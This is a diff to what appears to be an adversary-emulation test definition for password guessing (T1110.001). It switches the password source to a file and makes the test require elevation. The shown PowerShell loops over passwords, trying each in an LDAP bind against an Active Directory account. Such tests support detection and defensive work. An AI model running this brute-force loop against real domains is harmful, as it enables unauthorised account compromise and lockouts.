@@ -46,10 +46,10 @@ atomic_tests:
       description: Account to bruteforce
       type: String
       default: bruce.wayne
-    passwords:
+    passwords_path:
       description: List of passwords we will attempt to brute force with
-      type: String
-      default: Password1`n1q2w3e4r`nPassword!
+      type: Path
+      default: PathToAtomicsFolder\T1110.001\src\passwords.txt
     domain:
       description: Active Directory domain FQDN
       type: String
@@ -60,7 +60,7 @@ atomic_tests:
       default: NTLM
   executor:
     name: powershell
-    elevation_required: false
+    elevation_required: true
     command: |
       if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
         Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
@@ -70,8 +70,8 @@ atomic_tests:
       [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
       $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)
 
-      $passwords = "#{passwords}".split("{`n}")
-      foreach ($password in $passwords){
+      $passwordList = Get-Content -Path #{passwords_path}
+      foreach ($password in $passwordList){
         $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}")
         $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
         try {
